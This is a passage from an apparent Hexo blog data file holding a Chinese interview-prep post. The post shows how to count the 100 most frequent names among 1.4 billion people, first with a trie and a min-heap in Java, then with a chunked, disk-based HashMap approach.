O(L)复杂度:插入、查找和前缀匹配操作的时间复杂度为O(L),其中L是字符串的长度,显著提高了操作效率\n\n*   快速检索:相比于其他线性结构(如数组或链表),Trie树在处理大量字符串时更快\n\n\n8\\. Trie树的代码实现:\n---------------\n\n以下是一个 参考代码：\n\n```\n\n\nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.PriorityQueue;  \n  \nclass TrieNode {  \n    Map<Character, TrieNode> children;  \n    int count;  \n  \n    public TrieNode() {  \n        children = new HashMap<>();  \n        count = 0;  \n    }  \n}  \n  \nclass Trie {  \n    private TrieNode root;  \n  \n    public Trie() {  \n        root = new TrieNode();  \n    }  \n  \n    public void insert(String name) {  \n        TrieNode node = root;  \n        for (char ch : name.toCharArray()) {  \n            node = node.children.computeIfAbsent(ch, k -> new TrieNode());  \n        }  \n        node.count++;  \n    }  \n  \n    public void getAllNames(TrieNode node, StringBuilder prefix, PriorityQueue<NameCount> minHeap, int k) {  \n        if (node == null) return;  \n        if (node.count > 0) {  \n            if (minHeap.size() < k) {  \n                minHeap.offer(new NameCount(prefix.toString(), node.count));  \n            } else if (node.count > minHeap.peek().count) {  \n                minHeap.poll();  \n                minHeap.offer(new NameCount(prefix.toString(), node.count));  \n            }  \n        }  \n        for (Map.Entry<Character, TrieNode> entry : node.children.entrySet()) {  \n            prefix.append(entry.getKey());  \n            getAllNames(entry.getValue(), prefix, minHeap, k);  \n            prefix.deleteCharAt(prefix.length() - 1);  \n        }  \n    }  \n  \n    public PriorityQueue<NameCount> getTopKNames(int k) {  \n        PriorityQueue<NameCount> minHeap = new PriorityQueue<>(k);  \n        getAllNames(root, new StringBuilder(), minHeap, k);  \n        return minHeap;  \n    }  \n}  \n  \nclass NameCount implements Comparable<NameCount\\> {  \n    String name;  \n    int count;  \n  \n    public NameCount(String name, int count) {  \n        this.name = name;  \n        this.count = count;  \n    }  \n  \n    @Override  \n    public int compareTo(NameCount other) {  \n        return Integer.compare(this.count, other.count);  \n    }  \n  \n    @Override  \n    public String toString() {  \n        return name + \": \" + count;  \n    }  \n}  \n  \npublic class Main {  \n    public static void main(String\\[\\] args) {  \n        String\\[\\] names = {\"张伟\", \"王伟伟\", \"王芳\", \"李伟\", \"李娜\"}; // 示例数据  \n        int k = 100; // 找到前100个重名人数最多的姓名  \n  \n        Trie trie = new Trie();  \n        for (String name : names) {  \n            trie.insert(name);  \n        }  \n  \n        PriorityQueue<NameCount> topKNames = trie.getTopKNames(k);  \n        while (!topKNames.isEmpty()) {  \n            System.out.println(topKNames.poll());  \n        }  \n    }  \n}  \n\n\n\n```\n\n9\\. TOP N问题发散:\n--------------\n\n上面的问题进行改进一下, 如果我们对内存有一个限制,比如:要求内存的使用不能超过2G,\n\n注意，这里的内存受限，尽量使用磁盘处理。\n\n> 这里使用hashmap，而不适用 trie树的原因是？\n>\n> trie树是按照字符为粒度组织树的节点的，进行磁盘操作性能不高，而且进行磁盘操作时算法更加复杂。\n>\n> hashmap 是以key为单位操作的， 磁盘操作的效率高。而且 hashmap 统计的时候，代码简洁清晰。\n\n尽管我们hashmap，也不能直接将所有数据加载到内存中处理,\n\n所以可以采取分治的策略,使用外部排序和哈希映射的方法,\n\n以下是详细的步骤:\n\n1.分块读取数据:将14亿条记录分成多个较小的块,每次读取一部分数据到内存中进行处理\n\n2.哈希映射统计词频:对每个块的数据进行哈希映射,统计每个名字出现的次数,将结果写入到磁盘文件\n\n3.合并词频统计结果:读取所有中间文件,合并词频统计结果,得到全局的词频统计\n\n4.使用小顶堆找出前100个重复最多的名字\n\n```\n\n\nimport java.io.\\*;  \nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.PriorityQueue;  \n  \nclass NameCount implements Comparable<NameCount\\> {  \n    String name;  \n    int count;  \n  \n    public NameCount(String name, int count) {  \n        this.name = name;  \n        this.count = count;  \n    }  \n  \n    @Override  \n    public int compareTo(NameCount other) {  \n        return Integer.compare(this.count, other.count);  \n    }  \n  \n    @Override  \n    public String toString() {  \n        return name + \": \" + count;  \n    }  \n}  \n  \npublic class ExternalMemoryTopK {  \n    private static final int CHUNK\\_SIZE = 1000000; // 每个块处理100万条记录  \n  \n    public static void main(String\\[\\] args) throws IOException {  \n        String inputFile = \"names.txt\";  \n        String outputFile = \"top100names.txt\";  \n        int k = 100;  \n  \n        // 第一步：分块读取数据并统计词频  \n        int chunkIndex = 0;  \n        BufferedReader reader = new BufferedReader(new FileReader(inputFile));  \n        String line;  \n        while ((line = reader.readLine()) != null) {  \n            Map<String, Integer> frequencyMap = new HashMap<>();  \n            int lineCount = 0;  \n            while (line != null && lineCount < CHUNK\\_SIZE) {  \n                frequencyMap.put(line, frequencyMap.getOrDefault(line, 0) + 1);  \n                line = reader.readLine();  \n                lineCount++;  \n            }  \n            writeFrequencyMapToFile(frequencyMap, \"chunk\\_\" + chunkIndex + \".txt\");  \n            chunkIndex++;  \n        }  \n        reader.close();  \n  \n        // 第二步：合并所有块的词频统计结果  \n        Map<String, Integer> globalFrequencyMap = new HashMap<>();  \n        for (int i = 0; i < chunkIndex; i++) {  \n            mergeFrequencyMapFromFile(globalFrequencyMap, \"chunk\\_\" + i + \".txt\");  \n        }  \n  \n        // 第三步：使用小顶堆找出前100个重复最多的名字  \n        PriorityQueue<NameCount> minHeap = new PriorityQueue<>(k);  \n        for (Map.Entry<String, Integer> entry : globalFrequencyMap.entrySet()) {  \n            if (minHeap.size() < k) {  \n                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  \n            } else if (entry.getValue() > minHeap.peek().count) {  \n                minHeap.poll();  \n                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  \n            }  \n        }  \n  \n        // 输出结果  \n        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));  \n        while (!minHeap.isEmpty()) {  \n            writer.write(minHeap.poll().toString());  \n            writer.newLine();  \n        }  \n        writer.close();  \n    }  \n  \n    private static void writeFrequencyMapToFile(Map<String, Integer> frequencyMap, String filename) throws IOException {  \n        BufferedWriter writer = new BufferedWriter(new FileWriter(filename));  \n        for (Map.Entry<String, Integer> entry : frequencyMap.entrySet()) {  \n            writer.write(entry.getKey() + \" \" + entry.getValue());  \n            writer.newLine();  \n        }  \n        writer.close();  \n    }  \n  \n    private static void mergeFrequencyMapFromFile(Map<String, Integer> globalFrequencyMap, String filename) throws IOException {  \n        BufferedReader reader = new BufferedReader(new FileReader(filename));  \n        String line;  \n        while ((line = reader.readLine()) != null) {  \n            String\\[\\] parts = line.split(\" \");  \n            String name = parts\\[0\\];  \n            int count = Integer.parseInt(parts\\[1\\]);  \n            globalFrequencyMap.put(name, globalFrequencyMap.getOrDefault(name, 0) + count);  \n        }  \n        reader.close();  \n    }  \n}  \n\n\n\n```\n\n10\\. topK问题,典型的解题思路\n-------------------\n\n这是一种典型的topK问题,一般的问法如下：\n\n从一堆数据中选出多少个最大或最小数？\n\n解题思想：\n\n1.  先统计数量, 使用前缀树，hashmap等\n\n2.  再用小顶堆或者 大顶堆\n\n\n取大用小，取小用大。简单来说就是取最大的K个数就用小顶堆，取最小的K个数，就用大顶堆\n\n取海量数据里面最小的K个数？\n\n要找出数组中最小的K个数，就要构造一个有K个元素的大顶堆，因为大顶堆的堆顶值是最大的，其它元素和堆顶的元素比较，大于堆顶的元素，换一个元素继续，小于堆顶的元素，将堆顶元素出堆，将更小的元素插入堆顶，如此反复，堆里面就是最小的数\n\n取海量数据里面最大的K个数？\n\n要找出数组中最大的K个数，就要构造一个有K个元素的小顶堆，因为小顶堆的堆顶值是最小的，其它元素和堆顶的元素比较，大于堆顶的元素，堆顶的元素出堆，将元素插入到小顶堆，将更大的元素换到堆中，如此反复，堆里面就是最大的数\n\n","source":"_posts/统计全国重名最多的前100个.md","raw":"---\ntitle: 统计全国重名最多的前100个\ndate: 2024-06-02 17:16:17\ntags: 算法题\ncategories: 面试\n---\n\n\n阿里面试：全国14亿个姓名，统计出重名最多的前100个\n===========================\n\n\n> 全国14亿人的数据中，统计出重名人数最多的前100位姓名\n\n最近有小伙伴在面试阿里，遇到这个面试题。小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。\n\n**TOP N面试题是常见的算法题。**\n\nTOP N 统计的面试题，是一道非常常见的题目，大家一定要掌握好。\n\n\n1\\. 问题描述:\n---------\n\n我们需要从全国14亿人的数据中，统计出重名人数最多的前100位姓名\n\n2\\. 问题分析:\n---------\n\n我们的目标：是找到重名人数最多的前100个姓名,\n\n这意味着需要两步：\n\n*   需要有一个高效的数据结构来统计每个名字出现的次数,\n\n*   并快速找到出现次数最多的前100个名字.\n\n\n所以这个问题就转化成了下一个问题： 使用一种低成本、高性能的数据结构，来统计每个名字出现的次数。\n\n3\\. 如何选择一种最低成本、最高性能的数据结构？\n-------------------------\n\n常规的数据结构，选型如下:\n\n*   **数组**:\n\n\n如果姓名的字符集范围很大(支持所有的Unicode字符)，那么，需要极大且稀疏的数组,导致内存浪费严重,也不适合处理动态长度和多样性的字符串集合\n\n*   **链表**:\n\n    链表的插入和查找的操作时间复杂度为O(N), 并且，在大规模数据下性能低下,也不适合快速查找的场景\n\n*   **跳表**:\n\n\n跳表的插入、删除和查找操作的平均事件复杂度都是O(logN)，\n\n跳表式空间换时间的思想，主要是它需要额外的空间来维护多级索引，每个元素在最坏的情况下需要额外的存储空间，导致总的空间复杂度为O(N log N),\n\n在频繁的插入和查询的场景中，效率不高。\n\n来到我们现在这个场景，统计每个名字出现的次数时，不如哈希表在时间和空间的效率高效，哈希表的O(1)时间复杂度更适合大规模的数据频繁的插入和查询。\n\n*   **哈希表:**\n\n\n哈希表的插入和查找的时间复杂度都是O(1),\n\n但是在极端的情况下，哈希冲突会导致时间复杂度退化到O(N)，\n\n在空间效率中，哈希表需要额外的空间来维护键值对，来到这个场景，空间效率和哈希冲突都有潜在风险，\n\n最重要的是哈希表不能共享前缀，在处理大量的具有共同前缀的数据时候，也不适合。\n\n*   **平衡二叉搜索树(如AVL树或红黑树)**:\n\n\n能够维护有序数据,支持快速的插入、删除和查找操作,但在字符串的比较上,性能不如哈希表和Trie高效\n\n*   **前缀树**:\n\n\n前缀树通过共享前缀节点,节省了大量存储空间, 实现了成本的最低化\n\n前缀树对于字符串操作非常高效, 在这个问题中, 有很多名字共享相同前缀, Trie的结构能有效利用这一特点。\n\n经过上面的分析,能够看到Trie更适合统计每个名字出现的次数\n\n4\\. 如何快速筛选出Top 100？\n-------------------\n\n当知道了所有姓名出现的次数之后,、怎么样快速筛选出其中出现次数最多的前100个?\n\n首先想到的是直接排序。\n\n这个问题中,对14亿数据直接排序会有效率的问题，操作非常耗时。\n\n所以直接排序， 这种方法不可取。\n\n我们的目标是找到次数最多的前100个,可以利用堆的性质来完成。\n\n小顶堆总是保持堆顶为当前堆中最小的元素，这样可以确保当新的元素插入时，如果新元素大于堆顶元素，堆顶元素会被替换掉\n\n使用小顶堆的步骤:\n\n1.初始化一个小顶堆:设为100\n\n2.遍历每个姓名及其出现的次数:\n\n*   如果堆的大小小于100，将当前姓名及其出现次数插入堆中。\n\n*   如果当前姓名的出现次数大于堆顶元素的出现次数，则移除堆顶元素，并将当前姓名及其出现次数插入堆中。\n\n\n3.遍历完所有的姓名后,堆中即为重名人数最多的前100个姓名\n\n所以解决这个问题使用了前缀树 + 小顶堆\n\n5\\. 前缀树Trie树介绍\n--------------\n\n在计算机科学中，trie，又称前缀树或字典树，使用一些单词来构建Trie树,如下图所示:\n\n![](./2024/06/02/统计全国重名最多的前100个/1.png)\n\n从图片中可以看到一些有意思的特性:\n\n*   根节点没有数据\n\n*   从根节点到某一个节点,将他们的路径进行连接就组成了对应的字符串\n\n\n定义:\n\n> Trie树，又称为前缀树或字典树, 是一种用于高效存储和检索字符串集合的数据结构, 每个节点代表一个字符, 边表示从一个字符到另一个字符的路径, Trie树通过共享相同前缀的节点来节省存储空间\n\nTrie树是一种有序树，用于保存关联数组，其中的键通常是字符串。\n\n与二叉查找树不同，Trie树 的 键不是直接保存在节点中，而是由节点在树中的位置决定。\n\n一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。\n\n一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。\n\ntrie中的键通常是字符串，但也可以是其它的结构。\n\ntrie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。\n\n比如，bitwise trie中的键是一串位元，可以用于表示整数或者内存地址\n\n**Trie树基本性质**\n\n1，根节点不包含字符，除根节点意外每个节点只包含一个字符。\n\n2，从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。\n\n3，每个节点的所有子节点包含的字符串不相同。\n\n**Trie树优点**：\n\n可以最大限度地减少无谓的字符串比较，故可以用于词频统计和大量字符串排序。\n\n跟哈希表比较：\n\n1，最坏情况时间复杂度比hash表好\n\n2，没有冲突，除非一个key对应多个值（除key外的其他信息）\n\n3，自带排序功能（类似Radix Sort），中序遍历trie可以得到排序。\n\n**Trie树缺点**：\n\n当所有关键字都不具有相同或类似的前缀，空间消耗过大.\n\n6\\. Trie树的基本操作:\n---------------\n\n*   插入:将一个字符串逐字符插入到Trie树中\n\n*   查找:检查Trie树中是否存在某个字符串\n\n*   前缀匹配:查找所有以某个前缀开头的字符串\n\n*   删除:从Trie树中删除一个字符串\n\n\n7\\. Trie树的应用场景:\n---------------\n\n1.字符串检索:\n\n*   应用场景:快速检索字典中的单词\n\n*   使用原因:Trie树通过逐字符匹配,可以在O(L)时间内完成字符串的检索,其中L是字符串的长度,比传统的线性搜索更加高效\n\n\n2.自动补全:\n\n*   应用场景:搜索引擎和输入法中的自动补全功能\n\n*   适用原因:Trie树可以通过前缀查找快速提供所有以给定前缀开头的单词,有效提升用户输入体验\n\n\n3.前缀匹配:\n\n*   应用场景:寻找以特定前缀开头的所有字符串,如电话号码前缀匹配\n\n*   适用原因:Trie树天生适合处理前缀匹配问题,可以在O(L)时间内找到所有以特定前缀开头的字符串\n\n\n4.词频统计:\n\n*   应用场景:文本分析中统计单词出现频率\n\n*   适用原因:Trie树可以在插入过程中记录每个单词的出现次数,通过遍历Trie树可以快速统计所有单词的频率\n\n\n为什么适合这些场景:\n\n5.多模式匹配:\n\n*   应用场景:从文本中同时搜索多个模式(模式匹配算法)\n\n*   适用原因:Trie树可以构建多个模式的结构,通过一次遍历文本同时匹配多个模式,提高匹配效率\n\n\n为什么适用于这些场景:\n\n1.空间效率:\n\n*   共享前缀:Trie树通过共享前缀节点，减少了重复存储相同前缀的空间开销。\n\n*   节省内存:对于大量前缀相同的字符串集合，Trie树显著节省内存使用。\n\n\n2.时间效率:\n\n*   O(L)复杂度:插入、查找和前缀匹配操作的时间复杂度为O(L),其中L是字符串的长度,显著提高了操作效率\n\n*   快速检索:相比于其他线性结构(如数组或链表),Trie树在处理大量字符串时更快\n\n\n8\\. Trie树的代码实现:\n---------------\n\n以下是一个 参考代码：\n\n```\n\n\nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.PriorityQueue;  \n  \nclass TrieNode {  \n    Map<Character, TrieNode> children;  \n    int count;  \n  \n    public TrieNode() {  \n        children = new HashMap<>();  \n        count = 0;  \n    }  \n}  \n  \nclass Trie {  \n    private TrieNode root;  \n  \n    public Trie() {  \n        root = new TrieNode();  \n    }  \n  \n    public void insert(String name) {  \n        TrieNode node = root;  \n        for (char ch : name.toCharArray()) {  \n            node = node.children.computeIfAbsent(ch, k -> new TrieNode());  \n        }  \n        node.count++;  \n    }  \n  \n    public void getAllNames(TrieNode node, StringBuilder prefix, PriorityQueue<NameCount> minHeap, int k) {  \n        if (node == null) return;  \n        if (node.count > 0) {  \n            if (minHeap.size() < k) {  \n                minHeap.offer(new NameCount(prefix.toString(), node.count));  \n            } else if (node.count > minHeap.peek().count) {  \n                minHeap.poll();  \n                minHeap.offer(new NameCount(prefix.toString(), node.count));  \n            }  \n        }  \n        for (Map.Entry<Character, TrieNode> entry : node.children.entrySet()) {  \n            prefix.append(entry.getKey());  \n            getAllNames(entry.getValue(), prefix, minHeap, k);  \n            prefix.deleteCharAt(prefix.length() - 1);  \n        }  \n    }  \n  \n    public PriorityQueue<NameCount> getTopKNames(int k) {  \n        PriorityQueue<NameCount> minHeap = new PriorityQueue<>(k);  \n        getAllNames(root, new StringBuilder(), minHeap, k);  \n        return minHeap;  \n    }  \n}  \n  \nclass NameCount implements Comparable<NameCount\\> {  \n    String name;  \n    int count;  \n  \n    public NameCount(String name, int count) {  \n        this.name = name;  \n        this.count = count;  \n    }  \n  \n    @Override  \n    public int compareTo(NameCount other) {  \n        return Integer.compare(this.count, other.count);  \n    }  \n  \n    @Override  \n    public String toString() {  \n        return name + \": \" + count;  \n    }  \n}  \n  \npublic class Main {  \n    public static void main(String\\[\\] args) {  \n        String\\[\\] names = {\"张伟\", \"王伟伟\", \"王芳\", \"李伟\", \"李娜\"}; // 示例数据  \n        int k = 100; // 找到前100个重名人数最多的姓名  \n  \n        Trie trie = new Trie();  \n        for (String name : names) {  \n            trie.insert(name);  \n        }  \n  \n        PriorityQueue<NameCount> topKNames = trie.getTopKNames(k);  \n        while (!topKNames.isEmpty()) {  \n            System.out.println(topKNames.poll());  \n        }  \n    }  \n}  \n\n\n\n```\n\n9\\. TOP N问题发散:\n--------------\n\n上面的问题进行改进一下, 如果我们对内存有一个限制,比如:要求内存的使用不能超过2G,\n\n注意，这里的内存受限，尽量使用磁盘处理。\n\n> 这里使用hashmap，而不适用 trie树的原因是？\n>\n> trie树是按照字符为粒度组织树的节点的，进行磁盘操作性能不高，而且进行磁盘操作时算法更加复杂。\n>\n> hashmap 是以key为单位操作的， 磁盘操作的效率高。而且 hashmap 统计的时候，代码简洁清晰。\n\n尽管我们hashmap，也不能直接将所有数据加载到内存中处理,\n\n所以可以采取分治的策略,使用外部排序和哈希映射的方法,\n\n以下是详细的步骤:\n\n1.分块读取数据:将14亿条记录分成多个较小的块,每次读取一部分数据到内存中进行处理\n\n2.哈希映射统计词频:对每个块的数据进行哈希映射,统计每个名字出现的次数,将结果写入到磁盘文件\n\n3.合并词频统计结果:读取所有中间文件,合并词频统计结果,得到全局的词频统计\n\n4.使用小顶堆找出前100个重复最多的名字\n\n```\n\n\nimport java.io.\\*;  \nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.PriorityQueue;  \n  \nclass NameCount implements Comparable<NameCount\\> {  \n    String name;  \n    int count;  \n  \n    public NameCount(String name, int count) {  \n        this.name = name;  \n        this.count = count;  \n    }  \n  \n    @Override  \n    public int compareTo(NameCount other) {  \n        return Integer.compare(this.count, other.count);  \n    }  \n  \n    @Override  \n    public String toString() {  \n        return name + \": \" + count;  \n    }  \n}  \n  \npublic class ExternalMemoryTopK {  \n    private static final int CHUNK\\_SIZE = 1000000; // 每个块处理100万条记录  \n  \n    public static void main(String\\[\\] args) throws IOException {  \n        String inputFile = \"names.txt\";  \n        String outputFile = \"top100names.txt\";  \n        int k = 100;  \n  \n        // 第一步：分块读取数据并统计词频  \n        int chunkIndex = 0;  \n        BufferedReader reader = new BufferedReader(new FileReader(inputFile));  \n        String line;  \n        while ((line = reader.readLine()) != null) {  \n            Map<String, Integer> frequencyMap = new HashMap<>();  \n            int lineCount = 0;  \n            while (line != null && lineCount < CHUNK\\_SIZE) {  \n                frequencyMap.put(line, frequencyMap.getOrDefault(line, 0) + 1);  \n                line = reader.readLine();  \n                lineCount++;  \n            }  \n            writeFrequencyMapToFile(frequencyMap, \"chunk\\_\" + chunkIndex + \".txt\");  \n            chunkIndex++;  \n        }  \n        reader.close();  \n  \n        // 第二步：合并所有块的词频统计结果  \n        Map<String, Integer> globalFrequencyMap = new HashMap<>();  \n        for (int i = 0; i < chunkIndex; i++) {  \n            mergeFrequencyMapFromFile(globalFrequencyMap, \"chunk\\_\" + i + \".txt\");  \n        }  \n  \n        // 第三步：使用小顶堆找出前100个重复最多的名字  \n        PriorityQueue<NameCount> minHeap = new PriorityQueue<>(k);  \n        for (Map.Entry<String, Integer> entry : globalFrequencyMap.entrySet()) {  \n            if (minHeap.size() < k) {  \n                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  \n            } else if (entry.getValue() > minHeap.peek().count) {  \n                minHeap.poll();  \n                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  \n            }  \n        }  \n  \n        // 输出结果  \n        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));  \n        while (!minHeap.isEmpty()) {  \n            writer.write(minHeap.poll().toString());  \n            writer.newLine();  \n        }  \n        writer.close();  \n    }  \n  \n    private static void writeFrequencyMapToFile(Map<String, Integer> frequencyMap, String filename) throws IOException {  \n        BufferedWriter writer = new BufferedWriter(new FileWriter(filename));  \n        for (Map.Entry<String, Integer> entry : frequencyMap.entrySet()) {  \n            writer.write(entry.getKey() + \" \" + entry.getValue());  \n            writer.newLine();  \n        }  \n        writer.close();  \n    }  \n  \n    private static void mergeFrequencyMapFromFile(Map<String, Integer> globalFrequencyMap, String filename) throws IOException {  \n        BufferedReader reader = new BufferedReader(new FileReader(filename));  \n        String line;  \n        while ((line = reader.readLine()) != null) {  \n            String\\[\\] parts = line.split(\" \");  \n            String name = parts\\[0\\];  \n            int count = Integer.parseInt(parts\\[1\\]);  \n            globalFrequencyMap.put(name, globalFrequencyMap.getOrDefault(name, 0) + count);  \n        }  \n        reader.close();  \n    }  \n}  \n\n\n\n```\n\n10\\. topK问题,典型的解题思路\n-------------------\n\n这是一种典型的topK问题,一般的问法如下：\n\n从一堆数据中选出多少个最大或最小数？\n\n解题思想：\n\n1.  先统计数量, 使用前缀树，hashmap等\n\n2.  再用小顶堆或者 大顶堆\n\n\n取大用小，取小用大。简单来说就是取最大的K个数就用小顶堆，取最小的K个数，就用大顶堆\n\n取海量数据里面最小的K个数？\n\n要找出数组中最小的K个数，就要构造一个有K个元素的大顶堆，因为大顶堆的堆顶值是最大的，其它元素和堆顶的元素比较，大于堆顶的元素，换一个元素继续，小于堆顶的元素，将堆顶元素出堆，将更小的元素插入堆顶，如此反复，堆里面就是最小的数\n\n取海量数据里面最大的K个数？\n\n要找出数组中最大的K个数，就要构造一个有K个元素的小顶堆，因为小顶堆的堆顶值是最小的，其它元素和堆顶的元素比较，大于堆顶的元素，堆顶的元素出堆，将元素插入到小顶堆，将更大的元素换到堆中，如此反复，堆里面就是最大的数\n\n","slug":"统计全国重名最多的前100个","published":1,"updated":"2024-06-02T09:23:46.849Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryv002hbsuhamkm0pq9","content":"<h1 id=\"阿里面试：全国14亿个姓名，统计出重名最多的前100个\"><a href=\"#阿里面试：全国14亿个姓名，统计出重名最多的前100个\" class=\"headerlink\" title=\"阿里面试：全国14亿个姓名，统计出重名最多的前100个\"></a>阿里面试：全国14亿个姓名，统计出重名最多的前100个</h1><blockquote>\n<p>全国14亿人的数据中，统计出重名人数最多的前100位姓名</p>\n</blockquote>\n<p>最近有小伙伴在面试阿里，遇到这个面试题。小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p>\n<p><strong>TOP N面试题是常见的算法题。</strong></p>\n<p>TOP N 统计的面试题，是一道非常常见的题目，大家一定要掌握好。</p>\n<h2 id=\"1-问题描述\"><a href=\"#1-问题描述\" class=\"headerlink\" title=\"1. 问题描述:\"></a>1. 问题描述:</h2><p>我们需要从全国14亿人的数据中，统计出重名人数最多的前100位姓名</p>\n<h2 id=\"2-问题分析\"><a href=\"#2-问题分析\" class=\"headerlink\" title=\"2. 问题分析:\"></a>2. 问题分析:</h2><p>我们的目标：是找到重名人数最多的前100个姓名,</p>\n<p>这意味着需要两步：</p>\n<ul>\n<li><p>需要有一个高效的数据结构来统计每个名字出现的次数,</p>\n</li>\n<li><p>并快速找到出现次数最多的前100个名字.</p>\n</li>\n</ul>\n<p>所以这个问题就转化成了下一个问题： 使用一种低成本、高性能的数据结构，来统计每个名字出现的次数。</p>\n<h2 id=\"3-如何选择一种最低成本、最高性能的数据结构？\"><a href=\"#3-如何选择一种最低成本、最高性能的数据结构？\" class=\"headerlink\" title=\"3. 如何选择一种最低成本、最高性能的数据结构？\"></a>3. 如何选择一种最低成本、最高性能的数据结构？</h2><p>常规的数据结构，选型如下:</p>\n<ul>\n<li><strong>数组</strong>:</li>\n</ul>\n<p>如果姓名的字符集范围很大(支持所有的Unicode字符)，那么，需要极大且稀疏的数组,导致内存浪费严重,也不适合处理动态长度和多样性的字符串集合</p>\n<ul>\n<li><p><strong>链表</strong>:</p>\n<p>链表的插入和查找的操作时间复杂度为O(N), 并且，在大规模数据下性能低下,也不适合快速查找的场景</p>\n</li>\n<li><p><strong>跳表</strong>:</p>\n</li>\n</ul>\n<p>跳表的插入、删除和查找操作的平均事件复杂度都是O(logN)，</p>\n<p>跳表式空间换时间的思想，主要是它需要额外的空间来维护多级索引，每个元素在最坏的情况下需要额外的存储空间，导致总的空间复杂度为O(N log N),</p>\n<p>在频繁的插入和查询的场景中，效率不高。</p>\n<p>来到我们现在这个场景，统计每个名字出现的次数时，不如哈希表在时间和空间的效率高效，哈希表的O(1)时间复杂度更适合大规模的数据频繁的插入和查询。</p>\n<ul>\n<li><strong>哈希表:</strong></li>\n</ul>\n<p>哈希表的插入和查找的时间复杂度都是O(1),</p>\n<p>但是在极端的情况下，哈希冲突会导致时间复杂度退化到O(N)，</p>\n<p>在空间效率中，哈希表需要额外的空间来维护键值对，来到这个场景，空间效率和哈希冲突都有潜在风险，</p>\n<p>最重要的是哈希表不能共享前缀，在处理大量的具有共同前缀的数据时候，也不适合。</p>\n<ul>\n<li><strong>平衡二叉搜索树(如AVL树或红黑树)</strong>:</li>\n</ul>\n<p>能够维护有序数据,支持快速的插入、删除和查找操作,但在字符串的比较上,性能不如哈希表和Trie高效</p>\n<ul>\n<li><strong>前缀树</strong>:</li>\n</ul>\n<p>前缀树通过共享前缀节点,节省了大量存储空间, 实现了成本的最低化</p>\n<p>前缀树对于字符串操作非常高效, 在这个问题中, 有很多名字共享相同前缀, Trie的结构能有效利用这一特点。</p>\n<p>经过上面的分析,能够看到Trie更适合统计每个名字出现的次数</p>\n<h2 id=\"4-如何快速筛选出Top-100？\"><a href=\"#4-如何快速筛选出Top-100？\" class=\"headerlink\" title=\"4. 如何快速筛选出Top 100？\"></a>4. 如何快速筛选出Top 100？</h2><p>当知道了所有姓名出现的次数之后,、怎么样快速筛选出其中出现次数最多的前100个?</p>\n<p>首先想到的是直接排序。</p>\n<p>这个问题中,对14亿数据直接排序会有效率的问题，操作非常耗时。</p>\n<p>所以直接排序， 这种方法不可取。</p>\n<p>我们的目标是找到次数最多的前100个,可以利用堆的性质来完成。</p>\n<p>小顶堆总是保持堆顶为当前堆中最小的元素，这样可以确保当新的元素插入时，如果新元素大于堆顶元素，堆顶元素会被替换掉</p>\n<p>使用小顶堆的步骤:</p>\n<p>1.初始化一个小顶堆:设为100</p>\n<p>2.遍历每个姓名及其出现的次数:</p>\n<ul>\n<li><p>如果堆的大小小于100，将当前姓名及其出现次数插入堆中。</p>\n</li>\n<li><p>如果当前姓名的出现次数大于堆顶元素的出现次数，则移除堆顶元素，并将当前姓名及其出现次数插入堆中。</p>\n</li>\n</ul>\n<p>3.遍历完所有的姓名后,堆中即为重名人数最多的前100个姓名</p>\n<p>所以解决这个问题使用了前缀树 + 小顶堆</p>\n<h2 id=\"5-前缀树Trie树介绍\"><a href=\"#5-前缀树Trie树介绍\" class=\"headerlink\" title=\"5. 前缀树Trie树介绍\"></a>5. 前缀树Trie树介绍</h2><p>在计算机科学中，trie，又称前缀树或字典树，使用一些单词来构建Trie树,如下图所示:</p>\n<p><img src=\"/./2024/06/02/%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E9%87%8D%E5%90%8D%E6%9C%80%E5%A4%9A%E7%9A%84%E5%89%8D100%E4%B8%AA/1.png\"></p>\n<p>从图片中可以看到一些有意思的特性:</p>\n<ul>\n<li><p>根节点没有数据</p>\n</li>\n<li><p>从根节点到某一个节点,将他们的路径进行连接就组成了对应的字符串</p>\n</li>\n</ul>\n<p>定义:</p>\n<blockquote>\n<p>Trie树，又称为前缀树或字典树, 是一种用于高效存储和检索字符串集合的数据结构, 每个节点代表一个字符, 边表示从一个字符到另一个字符的路径, Trie树通过共享相同前缀的节点来节省存储空间</p>\n</blockquote>\n<p>Trie树是一种有序树，用于保存关联数组，其中的键通常是字符串。</p>\n<p>与二叉查找树不同，Trie树 的 键不是直接保存在节点中，而是由节点在树中的位置决定。</p>\n<p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>\n<p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>\n<p>trie中的键通常是字符串，但也可以是其它的结构。</p>\n<p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p>\n<p>比如，bitwise trie中的键是一串位元，可以用于表示整数或者内存地址</p>\n<p><strong>Trie树基本性质</strong></p>\n<p>1，根节点不包含字符，除根节点意外每个节点只包含一个字符。</p>\n<p>2，从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。</p>\n<p>3，每个节点的所有子节点包含的字符串不相同。</p>\n<p><strong>Trie树优点</strong>：</p>\n<p>可以最大限度地减少无谓的字符串比较，故可以用于词频统计和大量字符串排序。</p>\n<p>跟哈希表比较：</p>\n<p>1，最坏情况时间复杂度比hash表好</p>\n<p>2，没有冲突，除非一个key对应多个值（除key外的其他信息）</p>\n<p>3，自带排序功能（类似Radix 